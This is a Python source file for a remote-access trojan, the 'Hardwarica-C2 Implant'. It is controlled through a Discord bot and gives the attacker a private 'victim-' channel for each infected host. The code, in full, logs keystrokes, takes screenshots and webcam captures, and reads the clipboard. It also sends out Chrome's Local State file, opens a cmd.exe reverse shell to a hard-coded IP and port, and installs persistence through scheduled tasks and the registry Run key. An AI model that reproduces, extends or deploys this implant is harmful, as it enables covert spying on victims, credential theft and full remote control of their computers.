import discord
import os
import socket
import platform
import subprocess
import pyautogui
import pyperclip
import cv2
import threading
from pynput import keyboard
from discord.ext import commands

TOKEN = "DISCORD_BOT_TOKEN"
GUILD_ID = DISCORD_GUILD_ID

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

keylog = []
logging = False
victim_channel = None

async def setup_channel():
    global victim_channel
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    hostname = socket.gethostname()
    channel_name = f"victim-{hostname.lower()}"

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }

    existing = discord.utils.get(guild.text_channels, name=channel_name)
    if existing:
        victim_channel = existing
    else:
        victim_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)

@bot.event
async def on_ready():
    await setup_channel()
    if victim_channel:
        await victim_channel.send("✅ Hardwarica-C2 Implant Online")
        await victim_channel.send("📜 Commands:\n"
                                  "`!getinfo` - Get system info\n"
                                  "`!screenshot` - Capture screenshot\n"
                                  "`!clipboard` - Get clipboard\n"
                                  "`!camera` - Take webcam image\n"
                                  "`!keylogger` - Start keylogger\n"
                                  "`!dumpkeys` - Dump logged keystrokes\n"
                                  "`!stealcreds` - Exfiltrate Chrome Local State\n"
                                  "`!revshell` - Reverse shell to attacker\n"
                                  "`!persist` - Add cronjob persistence\n"
                                  "`!selfdestruct` - Remove implant\n"
                                  "`!upload <local_path>` - Upload a file to Discord\n"
                                  "`!download <remote_path>` - Download file from victim\n"
                                  "`!listdir <directory>` - List files in a directory\n"
                                  "`!winpersist` - Add persistence via Registry Run key)")

@bot.command()
async def getinfo(ctx):
    info = f"""
🖥️ System Info:
Hostname: {socket.gethostname()}
OS: {platform.system()} {platform.release()}
IP: {socket.gethostbyname(socket.gethostname())}
"""
    await victim_channel.send(f"```{info}```")

@bot.command()
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    await victim_channel.send(file=discord.File("screen.png"))
    os.remove("screen.png")

@bot.command()
async def clipboard(ctx):
    clip = pyperclip.paste()
    await victim_channel.send(f"📋 Clipboard:\n```{clip}```")

@bot.command()
async def camera(ctx):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("cam.png", frame)
        await victim_channel.send(file=discord.File("cam.png"))
        os.remove("cam.png")
    else:
        await victim_channel.send("❌ Camera access failed")
    cam.release()

def log_keys():
    def on_press(key):
        try:
            keylog.append(str(key.char))
        except AttributeError:
            keylog.append(str(key))
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@bot.command()
async def keylogger(ctx):
    global logging
    if not logging:
        logging = True
        thread = threading.Thread(target=log_keys, daemon=True)
        thread.start()
        await victim_channel.send("🔑 Keylogger started.")
    else:
        await victim_channel.send("🔑 Keylogger already running.")

@bot.command()
async def dumpkeys(ctx):
    global logging
    logging = False
    with open("keylog.txt", "w") as f:
        f.write("".join(keylog))
    await victim_channel.send(file=discord.File("keylog.txt"))
    os.remove("keylog.txt")
    keylog.clear()

@bot.command()
async def stealcreds(ctx):
    try:
        local_state_path = os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Local State"
        if os.path.exists(local_state_path):
            await victim_channel.send("🕵️ Sending Chrome Local State file...")
            await victim_channel.send(file=discord.File(local_state_path))
        else:
            await victim_channel.send("❌ Local State file not found.")
    except Exception as e:
        await victim_channel.send(f"⚠️ Error: {e}")

@bot.command()
async def revshell(ctx):
    await victim_channel.send("💻 Starting reverse shell to attacker...")
    ip = "192.168.1.112"
    port = 4444
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"Reverse shell connected!\n")
        subprocess.Popen(["cmd.exe"], stdin=s, stdout=s, stderr=s, shell=True)
    except Exception as e:
        await victim_channel.send(f"❌ Reverse shell failed: {e}")

@bot.command()
async def persist(ctx):
    try:
        path = os.path.abspath(__file__)
        username = os.getlogin()
        task_name = "HardwaricaUserUpdater"
        # Remove /RL HIGHEST to avoid needing admin
        command = f'schtasks /Create /SC ONLOGON /TN "{task_name}" /TR "python {path}" /RU {username} /F'
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        await victim_channel.send(f"📌 User-level persistence added:\n```{result}```")
    except subprocess.CalledProcessError as e:
        await victim_channel.send(f"❌ Persistence setup failed:\n```{e.output}```")


@bot.command()
async def selfdestruct(ctx):
    await victim_channel.send("☠️ Self-destructing...")
    os.remove(__file__)
    exit()

@bot.command()
async def upload(ctx, *, filepath):
    if os.path.exists(filepath):
        await victim_channel.send(file=discord.File(filepath))
    else:
        await victim_channel.send("❌ File not found.")

@bot.command()
async def download(ctx, *, filename):
    await victim_channel.send("📥 Awaiting file...")
    def check(msg):
        return msg.author == ctx.author and msg.attachments
    msg = await bot.wait_for("message", check=check)
    attachment = msg.attachments[0]
    save_path = os.path.join(os.getcwd(), filename)
    await attachment.save(save_path)
    await victim_channel.send(f"✅ File saved as `{save_path}`")

@bot.command()
async def listdir(ctx, *, path="."):
    try:
        files = os.listdir(path)
        listing = "\n".join(files)
        await victim_channel.send(f"📁 Contents of `{path}`:\n```{listing}```")
    except Exception as e:
        await victim_channel.send(f"❌ Error: {e}")

@bot.command()
async def winpersist(ctx):
    try:
        exe_path = os.path.abspath(__file__)
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v HardwaricaC2 /t REG_SZ /d "python {exe_path}" /f'
        subprocess.check_output(reg_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        await victim_channel.send("🪟 Registry persistence added via HKCU\\...\\Run")
    except subprocess.CalledProcessError as e:
        await victim_channel.send(f"❌ Failed to add persistence:\n```{e.output}```")

bot.run(TOKEN)
